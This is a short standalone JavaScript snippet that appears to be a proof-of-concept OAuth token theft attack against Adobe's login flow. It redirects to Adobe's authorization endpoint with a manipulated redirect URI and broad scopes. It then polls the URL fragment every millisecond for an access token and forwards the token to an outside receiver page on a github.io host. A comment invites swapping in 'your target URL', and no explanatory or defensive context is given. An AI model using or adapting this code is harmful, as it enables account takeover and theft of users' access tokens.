(function() {
    // Step 1: Redirect the current page
    window.location.href = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2Fprojectx_webapp%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Fnew.express.adobe.com/dsadsadasdsadasdsa%26state%3D%257B%2522jslibver%2522%253A%2522v2-v0.45.0-5-gb993c08%2522%252C%2522nonce%2522%253A%25221693044660360429%2522%257D%26code_challenge_method%3Dplain%26use_ms_for_expiry%3Dtrue&client_id=projectx_webapp&scope=ab.manage%2CAdobeID%2Copenid%2Cread_organizations%2Ccreative_cloud%2Ccreative_sdk%2Ctk_platform%2Ctk_platform_sync%2Caf_byof%2Cstk.a.license_skip.r%2Cstk.a.limited_license.cru%2Cadditional_info.optionalAgreements%2Cuds_read%2Cuds_write%2Caf_ltd_projectx%2Cunified_dev_portal%2Cadditional_info.ownerOrg%2Cadditional_info.roles%2CDCAPI%2Cadditional_info.auth_source%2Cadditional_info.authenticatingAccount%2Cpps.write%2Cpps.delete%2Cpps.image_write%2Ctk_platform_grant_free_subscription%2Cpps.read%2Cfirefly_api%2Cadditional_info.projectedProductContext%2Cadobeio.appregistry.read%2Cadobeio.appregistry.write%2Caccount_cluster.read%2Cindesign_services%2Ceduprofile.write%2Ceduprofile.read&state=%7B%22jslibver%22%3A%22v2-v0.45.0-5-gb993c08%22%2C%22nonce%22%3A%221693044660360429%22%7D&relay=db9d36da-dfc2-4b9f-9137-d9a0673ecaa5&locale=en_US&flow_type=token&dctx_id=v%3A2%2Cs%2Cdcp-r%2Cbg%3Aexpress2024%2C45faecb0-e687-11ee-a865-f545a8ca5d2c&idp_flow_type=login&ab_test=complete-account-new-design%2Cremove-default-month&s_p=google%2Cfacebook%2Capple%2Cmicrosoft%2Cline%2Ckakao&response_type=token&code_challenge_method=plain&redirect_uri=https%3A%2F%2Fnew.express.adobe.com%2F%3Fpostlogin%3Dtrue%23old_hash%3Dotp%3D704684072%26from_ims%3Dtrue%26client_id%3Dprojectx_webapp%26api%3Dauthorize%26scope%3Dab.manage%2CAdobeID%2Copenid%2Cread_organizations%2Ccreative_cloud%2Ccreative_sdk%2Ctk_platform%2Ctk_platform_sync%2Caf_byof%2Cstk.a.license_skip.r%2Cstk.a.limited_license.cru%2Cadditional_info.optionalAgreements%2Cuds_read%2Cuds_write%2Caf_ltd_projectx%2Cunified_dev_portal%2Cadditional_info.ownerOrg%2Cadditional_info.roles%2Cadditional_info.roles%2CDCAPI%2Cadditional_info.auth_source%2Cadditional_info.authenticatingAccount%2Cpps.write%2Cpps.delete%2Cpps.image_write%2Ctk_platform_grant_free_subscription%2Cpps.read%2Cfirefly_api%2Cadditional_info.projectedProductContext%2Cadobeio.appregistry.read%2Cadobeio.appregistry.write%2Caccount_cluster.read%2Cindesign_services%2Ceduprofile.write%2Ceduprofile.read&use_ms_for_expiry=true"; // <-- change to your target URL

    // Step 2: Start checking every millisecond for "#access_token"
    function checkForAccessToken() {
        try {
            const hash = window.location.hash;
            if (hash && hash.includes("access_token=")) {
                const params = new URLSearchParams(hash.substring(1)); // strip "#"
                const token = params.get("access_token");
                if (token) {
                    // Step 3: Redirect parent window with token in URL param
                    parent.window.location.href = "https://mrhavit.github.io/receiver?access_token=" + encodeURIComponent(token);
                }
            }
        } catch (e) {
            console.error("Error checking for access_token:", e);
        }
    }

    // Start checking in a tight loop (every millisecond)
    setInterval(checkForAccessToken, 1);
})();